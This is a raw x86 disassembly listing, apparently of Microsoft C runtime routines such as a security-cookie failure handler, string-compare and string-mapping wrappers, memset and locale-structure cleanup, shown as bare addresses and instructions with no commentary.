  425b53:	jne    0x425b5f
  425b55:	mov    DWORD PTR ds:0x45f510,0xbb40e64e
  425b5f:	pop    esi
  425b60:	leave  
  425b61:	ret    
  425b62:	push   0x118
  425b67:	push   0x428968
  425b6c:	call   0x423940
  425b71:	mov    eax,ds:0x45f510
  425b76:	xor    eax,DWORD PTR [ebp+0x4]
  425b79:	mov    DWORD PTR [ebp-0x1c],eax
  425b7c:	mov    eax,ds:0x45fe78
  425b81:	xor    ecx,ecx
  425b83:	cmp    eax,ecx
  425b85:	je     0x425ba6
  425b87:	mov    DWORD PTR [ebp-0x4],ecx
  425b8a:	push   DWORD PTR [ebp+0xc]
  425b8d:	push   DWORD PTR [ebp+0x8]
  425b90:	call   eax
  425b92:	pop    ecx
  425b93:	pop    ecx
  425b94:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b98:	jmp    0x425ca4
  425b9d:	xor    eax,eax
  425b9f:	inc    eax
  425ba0:	ret    
  425ba1:	mov    esp,DWORD PTR [ebp-0x18]
  425ba4:	jmp    0x425b94
  425ba6:	mov    eax,DWORD PTR [ebp+0x8]
  425ba9:	dec    eax
  425baa:	je     0x425bbf
  425bac:	mov    edi,0x428944
  425bb1:	mov    DWORD PTR [ebp-0x20],0x428890
  425bb8:	mov    esi,0xd4
  425bbd:	jmp    0x425bd0
  425bbf:	mov    edi,0x428870
  425bc4:	mov    DWORD PTR [ebp-0x20],0x4287d0
  425bcb:	mov    esi,0xb9
  425bd0:	mov    BYTE PTR [ebp-0x24],cl
  425bd3:	push   0x104
  425bd8:	lea    eax,[ebp-0x128]
  425bde:	push   eax
  425bdf:	push   ecx
  425be0:	call   DWORD PTR ds:0x428074
  425be6:	test   eax,eax
  425be8:	jne    0x425bfd
  425bea:	push   0x4284c4
  425bef:	lea    eax,[ebp-0x128]
  425bf5:	push   eax
  425bf6:	call   0x423d20
  425bfb:	pop    ecx
  425bfc:	pop    ecx
  425bfd:	lea    ebx,[ebp-0x128]
  425c03:	lea    eax,[ebp-0x128]
  425c09:	push   eax
  425c0a:	call   0x423f50
  425c0f:	pop    ecx
  425c10:	add    eax,0xb
  425c13:	cmp    eax,0x3c
  425c16:	jbe    0x425c41
  425c18:	lea    eax,[ebp-0x128]
  425c1e:	push   eax
  425c1f:	call   0x423f50
  425c24:	mov    ebx,eax
  425c26:	lea    eax,[ebp-0x128]
  425c2c:	sub    eax,0x31
  425c2f:	add    ebx,eax
  425c31:	push   0x3
  425c33:	push   0x4284c0
  425c38:	push   ebx
  425c39:	call   0x423e20
  425c3e:	add    esp,0x10
  425c41:	push   ebx
  425c42:	call   0x423f50
  425c47:	pop    ecx
  425c48:	lea    eax,[eax+esi*1+0xc]
  425c4c:	add    eax,0x3
  425c4f:	and    eax,0xfffffffc
  425c52:	call   0x423990
  425c57:	mov    DWORD PTR [ebp-0x18],esp
  425c5a:	mov    esi,esp
  425c5c:	push   edi
  425c5d:	push   esi
  425c5e:	call   0x423d20
  425c63:	mov    edi,0x4284a0
  425c68:	push   edi
  425c69:	push   esi
  425c6a:	call   0x423d30
  425c6f:	push   0x4287c4
  425c74:	push   esi
  425c75:	call   0x423d30
  425c7a:	push   ebx
  425c7b:	push   esi
  425c7c:	call   0x423d30
  425c81:	push   edi
  425c82:	push   esi
  425c83:	call   0x423d30
  425c88:	push   DWORD PTR [ebp-0x20]
  425c8b:	push   esi
  425c8c:	call   0x423d30
  425c91:	push   0x12010
  425c96:	push   0x428478
  425c9b:	push   esi
  425c9c:	call   0x423c22
  425ca1:	add    esp,0x3c
  425ca4:	push   0x3
  425ca6:	call   0x422dac
  425cab:	int3   
  425cac:	push   0x38
  425cae:	push   0x428d88
  425cb3:	call   0x423940
  425cb8:	xor    ebx,ebx
  425cba:	cmp    DWORD PTR ds:0x45fe9c,ebx
  425cc0:	jne    0x425cfa
  425cc2:	push   ebx
  425cc3:	push   ebx
  425cc4:	xor    esi,esi
  425cc6:	inc    esi
  425cc7:	push   esi
  425cc8:	push   0x428d84
  425ccd:	push   0x100
  425cd2:	push   ebx
  425cd3:	call   DWORD PTR ds:0x4280fc
  425cd9:	test   eax,eax
  425cdb:	je     0x425ce5
  425cdd:	mov    DWORD PTR ds:0x45fe9c,esi
  425ce3:	jmp    0x425cfa
  425ce5:	call   DWORD PTR ds:0x428018
  425ceb:	cmp    eax,0x78
  425cee:	jne    0x425cfa
  425cf0:	mov    DWORD PTR ds:0x45fe9c,0x2
  425cfa:	cmp    DWORD PTR [ebp+0x14],ebx
  425cfd:	jle    0x425d1a
  425cff:	mov    ecx,DWORD PTR [ebp+0x14]
  425d02:	mov    eax,DWORD PTR [ebp+0x10]
  425d05:	dec    ecx
  425d06:	cmp    BYTE PTR [eax],bl
  425d08:	je     0x425d12
  425d0a:	inc    eax
  425d0b:	cmp    ecx,ebx
  425d0d:	jne    0x425d05
  425d0f:	or     ecx,0xffffffff
  425d12:	or     eax,0xffffffff
  425d15:	sub    eax,ecx
  425d17:	add    DWORD PTR [ebp+0x14],eax
  425d1a:	mov    eax,ds:0x45fe9c
  425d1f:	cmp    eax,0x2
  425d22:	je     0x425f04
  425d28:	cmp    eax,ebx
  425d2a:	je     0x425f04
  425d30:	cmp    eax,0x1
  425d33:	jne    0x425f37
  425d39:	xor    edi,edi
  425d3b:	mov    DWORD PTR [ebp-0x1c],edi
  425d3e:	mov    DWORD PTR [ebp-0x20],ebx
  425d41:	mov    DWORD PTR [ebp-0x24],ebx
  425d44:	cmp    DWORD PTR [ebp+0x20],ebx
  425d47:	jne    0x425d51
  425d49:	mov    eax,ds:0x45fe94
  425d4e:	mov    DWORD PTR [ebp+0x20],eax
  425d51:	push   ebx
  425d52:	push   ebx
  425d53:	push   DWORD PTR [ebp+0x14]
  425d56:	push   DWORD PTR [ebp+0x10]
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d5e:	setne  al
  425d61:	lea    eax,[eax*8+0x1]
  425d68:	push   eax
  425d69:	push   DWORD PTR [ebp+0x20]
  425d6c:	call   DWORD PTR ds:0x4280f8
  425d72:	mov    esi,eax
  425d74:	mov    DWORD PTR [ebp-0x28],esi
  425d77:	cmp    esi,ebx
  425d79:	je     0x425f37
  425d7f:	mov    DWORD PTR [ebp-0x4],0x1
  425d86:	lea    eax,[esi+esi*1]
  425d89:	add    eax,0x3
  425d8c:	and    eax,0xfffffffc
  425d8f:	call   0x423990
  425d94:	mov    DWORD PTR [ebp-0x18],esp
  425d97:	mov    eax,esp
  425d99:	mov    DWORD PTR [ebp-0x2c],eax
  425d9c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da0:	jmp    0x425dbd
  425da2:	xor    eax,eax
  425da4:	inc    eax
  425da5:	ret    
  425da6:	mov    esp,DWORD PTR [ebp-0x18]
  425da9:	call   0x426dd5
  425dae:	xor    ebx,ebx
  425db0:	mov    DWORD PTR [ebp-0x2c],ebx
  425db3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425db7:	mov    edi,DWORD PTR [ebp-0x1c]
  425dba:	mov    esi,DWORD PTR [ebp-0x28]
  425dbd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425dc0:	jne    0x425dde
  425dc2:	lea    eax,[esi+esi*1]
  425dc5:	push   eax
  425dc6:	call   0x424662
  425dcb:	pop    ecx
  425dcc:	mov    DWORD PTR [ebp-0x2c],eax
  425dcf:	cmp    eax,ebx
  425dd1:	je     0x425f37
  425dd7:	mov    DWORD PTR [ebp-0x20],0x1
  425dde:	push   esi
  425ddf:	push   DWORD PTR [ebp-0x2c]
  425de2:	push   DWORD PTR [ebp+0x14]
  425de5:	push   DWORD PTR [ebp+0x10]
  425de8:	push   0x1
  425dea:	push   DWORD PTR [ebp+0x20]
  425ded:	call   DWORD PTR ds:0x4280f8
  425df3:	test   eax,eax
  425df5:	je     0x425ee1
  425dfb:	push   ebx
  425dfc:	push   ebx
  425dfd:	push   esi
  425dfe:	push   DWORD PTR [ebp-0x2c]
  425e01:	push   DWORD PTR [ebp+0xc]
  425e04:	push   DWORD PTR [ebp+0x8]
  425e07:	call   DWORD PTR ds:0x4280fc
  425e0d:	mov    edi,eax
  425e0f:	mov    DWORD PTR [ebp-0x1c],edi
  425e12:	cmp    edi,ebx
  425e14:	je     0x425ee1
  425e1a:	test   BYTE PTR [ebp+0xd],0x4
  425e1e:	je     0x425e4d
  425e20:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e23:	je     0x425ee1
  425e29:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e2c:	jg     0x425ee1
  425e32:	push   DWORD PTR [ebp+0x1c]
  425e35:	push   DWORD PTR [ebp+0x18]
  425e38:	push   esi
  425e39:	push   DWORD PTR [ebp-0x2c]
  425e3c:	push   DWORD PTR [ebp+0xc]
  425e3f:	push   DWORD PTR [ebp+0x8]
  425e42:	call   DWORD PTR ds:0x4280fc
  425e48:	jmp    0x425ee1
  425e4d:	mov    DWORD PTR [ebp-0x4],0x2
  425e54:	lea    eax,[edi+edi*1]
  425e57:	add    eax,0x3
  425e5a:	and    eax,0xfffffffc
  425e5d:	call   0x423990
  425e62:	mov    DWORD PTR [ebp-0x18],esp
  425e65:	mov    eax,esp
  425e67:	mov    DWORD PTR [ebp-0x30],eax
  425e6a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e6e:	jmp    0x425e8b
  425e70:	xor    eax,eax
  425e72:	inc    eax
  425e73:	ret    
  425e74:	mov    esp,DWORD PTR [ebp-0x18]
  425e77:	call   0x426dd5
  425e7c:	xor    ebx,ebx
  425e7e:	mov    DWORD PTR [ebp-0x30],ebx
  425e81:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e85:	mov    edi,DWORD PTR [ebp-0x1c]
  425e88:	mov    esi,DWORD PTR [ebp-0x28]
  425e8b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e8e:	jne    0x425ea8
  425e90:	lea    eax,[edi+edi*1]
  425e93:	push   eax
  425e94:	call   0x424662
  425e99:	pop    ecx
  425e9a:	mov    DWORD PTR [ebp-0x30],eax
  425e9d:	cmp    eax,ebx
  425e9f:	je     0x425ee1
  425ea1:	mov    DWORD PTR [ebp-0x24],0x1
  425ea8:	push   edi
  425ea9:	push   DWORD PTR [ebp-0x30]
  425eac:	push   esi
  425ead:	push   DWORD PTR [ebp-0x2c]
  425eb0:	push   DWORD PTR [ebp+0xc]
  425eb3:	push   DWORD PTR [ebp+0x8]
  425eb6:	call   DWORD PTR ds:0x4280fc
  425ebc:	test   eax,eax
  425ebe:	je     0x425ee1
  425ec0:	push   ebx
  425ec1:	push   ebx
  425ec2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425ec5:	jne    0x425ecb
  425ec7:	push   ebx
  425ec8:	push   ebx
  425ec9:	jmp    0x425ed1
  425ecb:	push   DWORD PTR [ebp+0x1c]
  425ece:	push   DWORD PTR [ebp+0x18]
  425ed1:	push   edi
  425ed2:	push   DWORD PTR [ebp-0x30]
  425ed5:	push   ebx
  425ed6:	push   DWORD PTR [ebp+0x20]
  425ed9:	call   DWORD PTR ds:0x428088
  425edf:	mov    edi,eax
  425ee1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ee4:	je     0x425eef
  425ee6:	push   DWORD PTR [ebp-0x30]
  425ee9:	call   0x42454a
  425eee:	pop    ecx
  425eef:	cmp    DWORD PTR [ebp-0x20],ebx
  425ef2:	je     0x425efd
  425ef4:	push   DWORD PTR [ebp-0x2c]
  425ef7:	call   0x42454a
  425efc:	pop    ecx
  425efd:	mov    eax,edi
  425eff:	jmp    0x42605f
  425f04:	mov    DWORD PTR [ebp-0x34],ebx
  425f07:	xor    edi,edi
  425f09:	mov    DWORD PTR [ebp-0x38],ebx
  425f0c:	cmp    DWORD PTR [ebp+0x8],ebx
  425f0f:	jne    0x425f19
  425f11:	mov    eax,ds:0x45fe84
  425f16:	mov    DWORD PTR [ebp+0x8],eax
  425f19:	cmp    DWORD PTR [ebp+0x20],ebx
  425f1c:	jne    0x425f26
  425f1e:	mov    eax,ds:0x45fe94
  425f23:	mov    DWORD PTR [ebp+0x20],eax
  425f26:	push   DWORD PTR [ebp+0x8]
  425f29:	call   0x426bbd
  425f2e:	pop    ecx
  425f2f:	mov    DWORD PTR [ebp-0x3c],eax
  425f32:	cmp    eax,0xffffffff
  425f35:	jne    0x425f3e
  425f37:	xor    eax,eax
  425f39:	jmp    0x42605f
  425f3e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f41:	je     0x426035
  425f47:	push   ebx
  425f48:	push   ebx
  425f49:	lea    ecx,[ebp+0x14]
  425f4c:	push   ecx
  425f4d:	push   DWORD PTR [ebp+0x10]
  425f50:	push   eax
  425f51:	push   DWORD PTR [ebp+0x20]
  425f54:	call   0x426c06
  425f59:	add    esp,0x18
  425f5c:	mov    DWORD PTR [ebp-0x34],eax
  425f5f:	cmp    eax,ebx
  425f61:	je     0x425f37
  425f63:	push   ebx
  425f64:	push   ebx
  425f65:	push   DWORD PTR [ebp+0x14]
  425f68:	push   eax
  425f69:	push   DWORD PTR [ebp+0xc]
  425f6c:	push   DWORD PTR [ebp+0x8]
  425f6f:	call   DWORD PTR ds:0x4280f4
  425f75:	mov    esi,eax
  425f77:	mov    DWORD PTR [ebp-0x40],esi
  425f7a:	cmp    esi,ebx
  425f7c:	je     0x426024
  425f82:	mov    DWORD PTR [ebp-0x4],ebx
  425f85:	add    eax,0x3
  425f88:	and    eax,0xfffffffc
  425f8b:	call   0x423990
  425f90:	mov    DWORD PTR [ebp-0x18],esp
  425f93:	mov    edi,esp
  425f95:	mov    DWORD PTR [ebp-0x44],edi
  425f98:	push   esi
  425f99:	push   ebx
  425f9a:	push   edi
  425f9b:	call   0x426240
  425fa0:	add    esp,0xc
  425fa3:	jmp    0x425fb5
  425fa5:	xor    eax,eax
  425fa7:	inc    eax
  425fa8:	ret    
  425fa9:	mov    esp,DWORD PTR [ebp-0x18]
  425fac:	call   0x426dd5
  425fb1:	xor    ebx,ebx
  425fb3:	xor    edi,edi
  425fb5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fb9:	cmp    edi,ebx
  425fbb:	jne    0x425fe0
  425fbd:	push   DWORD PTR [ebp-0x40]
  425fc0:	call   0x424662
  425fc5:	pop    ecx
  425fc6:	mov    edi,eax
  425fc8:	cmp    edi,ebx
  425fca:	je     0x425ffd
  425fcc:	push   DWORD PTR [ebp-0x40]
  425fcf:	push   ebx
  425fd0:	push   edi
  425fd1:	call   0x426240
  425fd6:	add    esp,0xc
  425fd9:	mov    DWORD PTR [ebp-0x38],0x1
  425fe0:	push   DWORD PTR [ebp-0x40]
  425fe3:	push   edi
  425fe4:	push   DWORD PTR [ebp+0x14]
  425fe7:	push   DWORD PTR [ebp-0x34]
  425fea:	push   DWORD PTR [ebp+0xc]
  425fed:	push   DWORD PTR [ebp+0x8]
  425ff0:	call   DWORD PTR ds:0x4280f4
  425ff6:	mov    DWORD PTR [ebp-0x40],eax
  425ff9:	cmp    eax,ebx
  425ffb:	jne    0x426001
  425ffd:	xor    esi,esi
  425fff:	jmp    0x426027
  426001:	push   DWORD PTR [ebp+0x1c]
  426004:	push   DWORD PTR [ebp+0x18]
  426007:	lea    eax,[ebp-0x40]
  42600a:	push   eax
  42600b:	push   edi
  42600c:	push   DWORD PTR [ebp+0x20]
  42600f:	push   DWORD PTR [ebp-0x3c]
  426012:	call   0x426c06
  426017:	add    esp,0x18
  42601a:	mov    esi,eax
  42601c:	neg    esi
  42601e:	sbb    esi,esi
  426020:	neg    esi
  426022:	jmp    0x426027
  426024:	mov    esi,DWORD PTR [ebp-0x48]
  426027:	cmp    DWORD PTR [ebp-0x38],ebx
  42602a:	je     0x42604f
  42602c:	push   edi
  42602d:	call   0x42454a
  426032:	pop    ecx
  426033:	jmp    0x42604f
  426035:	push   DWORD PTR [ebp+0x1c]
  426038:	push   DWORD PTR [ebp+0x18]
  42603b:	push   DWORD PTR [ebp+0x14]
  42603e:	push   DWORD PTR [ebp+0x10]
  426041:	push   DWORD PTR [ebp+0xc]
  426044:	push   DWORD PTR [ebp+0x8]
  426047:	call   DWORD PTR ds:0x4280f4
  42604d:	mov    esi,eax
  42604f:	cmp    DWORD PTR [ebp-0x34],ebx
  426052:	je     0x42605d
  426054:	push   DWORD PTR [ebp-0x34]
  426057:	call   0x42454a
  42605c:	pop    ecx
  42605d:	mov    eax,esi
  42605f:	lea    esp,[ebp-0x54]
  426062:	call   0x42397b
  426067:	ret    
  426068:	push   0x1c
  42606a:	push   0x428db0
  42606f:	call   0x423940
  426074:	xor    esi,esi
  426076:	cmp    DWORD PTR ds:0x45fea0,esi
  42607c:	jne    0x4260b3
  42607e:	lea    eax,[ebp-0x1c]
  426081:	push   eax
  426082:	xor    edi,edi
  426084:	inc    edi
  426085:	push   edi
  426086:	push   0x428d84
  42608b:	push   edi
  42608c:	call   DWORD PTR ds:0x428104
  426092:	test   eax,eax
  426094:	je     0x42609e
  426096:	mov    DWORD PTR ds:0x45fea0,edi
  42609c:	jmp    0x4260b3
  42609e:	call   DWORD PTR ds:0x428018
  4260a4:	cmp    eax,0x78
  4260a7:	jne    0x4260b3
  4260a9:	mov    DWORD PTR ds:0x45fea0,0x2
  4260b3:	mov    eax,ds:0x45fea0
  4260b8:	cmp    eax,0x2
  4260bb:	je     0x4261ab
  4260c1:	cmp    eax,esi
  4260c3:	je     0x4261ab
  4260c9:	cmp    eax,0x1
  4260cc:	jne    0x4261d1
  4260d2:	mov    DWORD PTR [ebp-0x20],esi
  4260d5:	mov    DWORD PTR [ebp-0x24],esi
  4260d8:	cmp    DWORD PTR [ebp+0x18],esi
  4260db:	jne    0x4260e5
  4260dd:	mov    eax,ds:0x45fe94
  4260e2:	mov    DWORD PTR [ebp+0x18],eax
  4260e5:	push   esi
  4260e6:	push   esi
  4260e7:	push   DWORD PTR [ebp+0x10]
  4260ea:	push   DWORD PTR [ebp+0xc]
  4260ed:	xor    eax,eax
  4260ef:	cmp    DWORD PTR [ebp+0x20],esi
  4260f2:	setne  al
  4260f5:	lea    eax,[eax*8+0x1]
  4260fc:	push   eax
  4260fd:	push   DWORD PTR [ebp+0x18]
  426100:	call   DWORD PTR ds:0x4280f8
  426106:	mov    edi,eax
  426108:	mov    DWORD PTR [ebp-0x28],edi
  42610b:	test   edi,edi
  42610d:	je     0x4261d1
  426113:	and    DWORD PTR [ebp-0x4],0x0
  426117:	lea    ebx,[edi+edi*1]
  42611a:	mov    eax,ebx
  42611c:	add    eax,0x3
  42611f:	and    eax,0xfffffffc
  426122:	call   0x423990
  426127:	mov    DWORD PTR [ebp-0x18],esp
  42612a:	mov    esi,esp
  42612c:	mov    DWORD PTR [ebp-0x2c],esi
  42612f:	push   ebx
  426130:	push   0x0
  426132:	push   esi
  426133:	call   0x426240
  426138:	add    esp,0xc
  42613b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42613f:	jmp    0x426156
  426141:	xor    eax,eax
  426143:	inc    eax
  426144:	ret    
  426145:	mov    esp,DWORD PTR [ebp-0x18]
  426148:	call   0x426dd5
  42614d:	xor    esi,esi
  42614f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426153:	mov    edi,DWORD PTR [ebp-0x28]
  426156:	test   esi,esi
  426158:	jne    0x426171
  42615a:	push   edi
  42615b:	push   0x2
  42615d:	call   0x424a58
  426162:	pop    ecx
  426163:	pop    ecx
  426164:	mov    esi,eax
  426166:	test   esi,esi
  426168:	je     0x4261d1
  42616a:	mov    DWORD PTR [ebp-0x24],0x1
  426171:	push   edi
  426172:	push   esi
  426173:	push   DWORD PTR [ebp+0x10]
  426176:	push   DWORD PTR [ebp+0xc]
  426179:	push   0x1
  42617b:	push   DWORD PTR [ebp+0x18]
  42617e:	call   DWORD PTR ds:0x4280f8
  426184:	test   eax,eax
  426186:	je     0x426199
  426188:	push   DWORD PTR [ebp+0x14]
  42618b:	push   eax
  42618c:	push   esi
  42618d:	push   DWORD PTR [ebp+0x8]
  426190:	call   DWORD PTR ds:0x428104
  426196:	mov    DWORD PTR [ebp-0x20],eax
  426199:	cmp    DWORD PTR [ebp-0x24],0x0
  42619d:	je     0x4261a6
  42619f:	push   esi
  4261a0:	call   0x42454a
  4261a5:	pop    ecx
  4261a6:	mov    eax,DWORD PTR [ebp-0x20]
  4261a9:	jmp    0x426219
  4261ab:	mov    ebx,DWORD PTR [ebp+0x1c]
  4261ae:	cmp    ebx,esi
  4261b0:	jne    0x4261b8
  4261b2:	mov    ebx,DWORD PTR ds:0x45fe84
  4261b8:	mov    edi,DWORD PTR [ebp+0x18]
  4261bb:	test   edi,edi
  4261bd:	jne    0x4261c5
  4261bf:	mov    edi,DWORD PTR ds:0x45fe94
  4261c5:	push   ebx
  4261c6:	call   0x426bbd
  4261cb:	pop    ecx
  4261cc:	cmp    eax,0xffffffff
  4261cf:	jne    0x4261d5
  4261d1:	xor    eax,eax
  4261d3:	jmp    0x426219
  4261d5:	cmp    eax,edi
  4261d7:	je     0x4261f7
  4261d9:	push   0x0
  4261db:	push   0x0
  4261dd:	lea    ecx,[ebp+0x10]
  4261e0:	push   ecx
  4261e1:	push   DWORD PTR [ebp+0xc]
  4261e4:	push   eax
  4261e5:	push   edi
  4261e6:	call   0x426c06
  4261eb:	add    esp,0x18
  4261ee:	mov    esi,eax
  4261f0:	test   esi,esi
  4261f2:	je     0x4261d1
  4261f4:	mov    DWORD PTR [ebp+0xc],esi
  4261f7:	push   DWORD PTR [ebp+0x14]
  4261fa:	push   DWORD PTR [ebp+0x10]
  4261fd:	push   DWORD PTR [ebp+0xc]
  426200:	push   DWORD PTR [ebp+0x8]
  426203:	push   ebx
  426204:	call   DWORD PTR ds:0x428100
  42620a:	mov    edi,eax
  42620c:	test   esi,esi
  42620e:	je     0x426217
  426210:	push   esi
  426211:	call   0x42454a
  426216:	pop    ecx
  426217:	mov    eax,edi
  426219:	lea    esp,[ebp-0x38]
  42621c:	call   0x42397b
  426221:	ret    
  426222:	mov    eax,ds:0x45fea4
  426227:	test   eax,eax
  426229:	je     0x42623a
  42622b:	push   DWORD PTR [esp+0x4]
  42622f:	call   eax
  426231:	test   eax,eax
  426233:	pop    ecx
  426234:	je     0x42623a
  426236:	xor    eax,eax
  426238:	inc    eax
  426239:	ret    
  42623a:	xor    eax,eax
  42623c:	ret    
  42623d:	int3   
  42623e:	int3   
  42623f:	int3   
  426240:	mov    edx,DWORD PTR [esp+0xc]
  426244:	mov    ecx,DWORD PTR [esp+0x4]
  426248:	test   edx,edx
  42624a:	je     0x42629b
  42624c:	xor    eax,eax
  42624e:	mov    al,BYTE PTR [esp+0x8]
  426252:	push   edi
  426253:	mov    edi,ecx
  426255:	cmp    edx,0x4
  426258:	jb     0x42628b
  42625a:	neg    ecx
  42625c:	and    ecx,0x3
  42625f:	je     0x42626d
  426261:	sub    edx,ecx
  426263:	mov    BYTE PTR [edi],al
  426265:	add    edi,0x1
  426268:	sub    ecx,0x1
  42626b:	jne    0x426263
  42626d:	mov    ecx,eax
  42626f:	shl    eax,0x8
  426272:	add    eax,ecx
  426274:	mov    ecx,eax
  426276:	shl    eax,0x10
  426279:	add    eax,ecx
  42627b:	mov    ecx,edx
  42627d:	and    edx,0x3
  426280:	shr    ecx,0x2
  426283:	je     0x42628b
  426285:	rep stos DWORD PTR es:[edi],eax
  426287:	test   edx,edx
  426289:	je     0x426295
  42628b:	mov    BYTE PTR [edi],al
  42628d:	add    edi,0x1
  426290:	sub    edx,0x1
  426293:	jne    0x42628b
  426295:	mov    eax,DWORD PTR [esp+0x8]
  426299:	pop    edi
  42629a:	ret    
  42629b:	mov    eax,DWORD PTR [esp+0x4]
  42629f:	ret    
  4262a0:	push   esi
  4262a1:	mov    esi,DWORD PTR [esp+0x8]
  4262a5:	test   esi,esi
  4262a7:	je     0x42642e
  4262ad:	push   DWORD PTR [esi+0x4]
  4262b0:	call   0x42454a
  4262b5:	push   DWORD PTR [esi+0x8]
  4262b8:	call   0x42454a
  4262bd:	push   DWORD PTR [esi+0xc]
  4262c0:	call   0x42454a
  4262c5:	push   DWORD PTR [esi+0x10]
  4262c8:	call   0x42454a
  4262cd:	push   DWORD PTR [esi+0x14]
  4262d0:	call   0x42454a
  4262d5:	push   DWORD PTR [esi+0x18]
  4262d8:	call   0x42454a
  4262dd:	push   DWORD PTR [esi]
  4262df:	call   0x42454a
  4262e4:	push   DWORD PTR [esi+0x20]
  4262e7:	call   0x42454a
  4262ec:	push   DWORD PTR [esi+0x24]
  4262ef:	call   0x42454a
  4262f4:	push   DWORD PTR [esi+0x28]
  4262f7:	call   0x42454a
  4262fc:	push   DWORD PTR [esi+0x2c]
  4262ff:	call   0x42454a
  426304:	push   DWORD PTR [esi+0x30]
  426307:	call   0x42454a
  42630c:	push   DWORD PTR [esi+0x34]
  42630f:	call   0x42454a
  426314:	push   DWORD PTR [esi+0x1c]
  426317:	call   0x42454a
  42631c:	push   DWORD PTR [esi+0x38]
  42631f:	call   0x42454a
  426324:	push   DWORD PTR [esi+0x3c]
  426327:	call   0x42454a
  42632c:	add    esp,0x40
  42632f:	push   DWORD PTR [esi+0x40]
  426332:	call   0x42454a
  426337:	push   DWORD PTR [esi+0x44]
  42633a:	call   0x42454a
  42633f:	push   DWORD PTR [esi+0x48]
  426342:	call   0x42454a
  426347:	push   DWORD PTR [esi+0x4c]
  42634a:	call   0x42454a
  42634f:	push   DWORD PTR [esi+0x50]
  426352:	call   0x42454a
  426357:	push   DWORD PTR [esi+0x54]
  42635a:	call   0x42454a
  42635f:	push   DWORD PTR [esi+0x58]
  426362:	call   0x42454a
  426367:	push   DWORD PTR [esi+0x5c]
  42636a:	call   0x42454a
  42636f:	push   DWORD PTR [esi+0x60]
  426372:	call   0x42454a
  426377:	push   DWORD PTR [esi+0x64]
  42637a:	call   0x42454a
  42637f:	push   DWORD PTR [esi+0x68]
  426382:	call   0x42454a
  426387:	push   DWORD PTR [esi+0x6c]
  42638a:	call   0x42454a
  42638f:	push   DWORD PTR [esi+0x70]
  426392:	call   0x42454a
  426397:	push   DWORD PTR [esi+0x74]
  42639a:	call   0x42454a
  42639f:	push   DWORD PTR [esi+0x78]
  4263a2:	call   0x42454a
  4263a7:	push   DWORD PTR [esi+0x7c]
  4263aa:	call   0x42454a
  4263af:	add    esp,0x40
  4263b2:	push   DWORD PTR [esi+0x80]
  4263b8:	call   0x42454a
  4263bd:	push   DWORD PTR [esi+0x84]
  4263c3:	call   0x42454a
  4263c8:	push   DWORD PTR [esi+0x88]
  4263ce:	call   0x42454a
  4263d3:	push   DWORD PTR [esi+0x8c]
  4263d9:	call   0x42454a
  4263de:	push   DWORD PTR [esi+0x90]
  4263e4:	call   0x42454a
  4263e9:	push   DWORD PTR [esi+0x94]
  4263ef:	call   0x42454a
  4263f4:	push   DWORD PTR [esi+0x98]
  4263fa:	call   0x42454a
  4263ff:	push   DWORD PTR [esi+0x9c]
  426405:	call   0x42454a
  42640a:	push   DWORD PTR [esi+0xa0]
  426410:	call   0x42454a
  426415:	push   DWORD PTR [esi+0xa4]
  42641b:	call   0x42454a
  426420:	push   DWORD PTR [esi+0xa8]
  426426:	call   0x42454a
  42642b:	add    esp,0x2c
  42642e:	pop    esi
  42642f:	ret    
  426430:	push   esi
  426431:	mov    esi,DWORD PTR [esp+0x8]
  426435:	test   esi,esi
  426437:	je     0x42648d
  426439:	mov    eax,DWORD PTR [esi]
  42643b:	mov    ecx,DWORD PTR ds:0x45fa14
  426441:	cmp    eax,DWORD PTR [ecx]
  426443:	je     0x426454
  426445:	cmp    eax,DWORD PTR ds:0x45f9e4
  42644b:	je     0x426454
  42644d:	push   eax
  42644e:	call   0x42454a
  426453:	pop    ecx
  426454:	mov    eax,DWORD PTR [esi+0x4]
  426457:	mov    ecx,DWORD PTR ds:0x45fa14
  42645d:	cmp    eax,DWORD PTR [ecx+0x4]
  426460:	je     0x426471
  426462:	cmp    eax,DWORD PTR ds:0x45f9e8
  426468:	je     0x426471
  42646a:	push   eax
  42646b:	call   0x42454a
  426470:	pop    ecx
  426471:	mov    esi,DWORD PTR [esi+0x8]
  426474:	mov    eax,ds:0x45fa14
  426479:	cmp    esi,DWORD PTR [eax+0x8]
  42647c:	je     0x42648d
  42647e:	cmp    esi,DWORD PTR ds:0x45f9ec
  426484:	je     0x42648d
  426486:	push   esi
  426487:	call   0x42454a
  42648c:	pop    ecx
  42648d:	pop    esi
  42648e:	ret    
  42648f:	push   esi
  426490:	mov    esi,DWORD PTR [esp+0x8]
  426494:	test   esi,esi
  426496:	je     0x426566
  42649c:	mov    eax,DWORD PTR [esi+0xc]
  42649f:	mov    ecx,DWORD PTR ds:0x45fa14
  4264a5:	cmp    eax,DWORD PTR [ecx+0xc]
  4264a8:	je     0x4264b9
  4264aa:	cmp    eax,DWORD PTR ds:0x45f9f0
  4264b0:	je     0x4264b9
  4264b2:	push   eax
  4264b3:	call   0x42454a
  4264b8:	pop    ecx
  4264b9:	mov    eax,DWORD PTR [esi+0x10]
  4264bc:	mov    ecx,DWORD PTR ds:0x45fa14
  4264c2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264c5:	je     0x4264d6
  4264c7:	cmp    eax,DWORD PTR ds:0x45f9f4
  4264cd:	je     0x4264d6
  4264cf:	push   eax
  4264d0:	call   0x42454a
  4264d5:	pop    ecx
  4264d6:	mov    eax,DWORD PTR [esi+0x14]
  4264d9:	mov    ecx,DWORD PTR ds:0x45fa14
  4264df:	cmp    eax,DWORD PTR [ecx+0x14]
  4264e2:	je     0x4264f3
  4264e4:	cmp    eax,DWORD PTR ds:0x45f9f8
  4264ea:	je     0x4264f3
  4264ec:	push   eax
  4264ed:	call   0x42454a
  4264f2:	pop    ecx
